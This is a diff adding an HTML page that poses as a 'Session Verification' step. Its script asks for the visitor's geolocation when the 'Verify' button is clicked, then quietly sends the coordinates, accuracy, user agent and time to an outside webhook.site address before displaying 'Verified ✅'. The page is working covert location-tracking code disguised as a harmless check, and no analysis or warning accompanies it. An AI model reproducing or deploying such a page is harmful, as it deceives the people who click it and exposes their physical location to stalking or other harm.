@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verification</title>
+</head>
+<body style="font-family:Arial;text-align:center;margin-top:50px;">
+  <h3>Session Verification</h3>
+  <button onclick="sendLocation()">Verify</button>
+
+  <script>
+    function sendLocation() {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          fetch("https://webhook.site/a55ffe99-f30b-44b2-80c6-3f31ae2fa387", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              userAgent: navigator.userAgent,
+              time: new Date().toISOString()
+            })
+          });
+          document.body.innerHTML = "<h3>Verified ✅</h3>";
+        },
+        (err) => alert("Location denied: " + err.message)
+      );
+    }
+  </script>
+</body>
+</html>
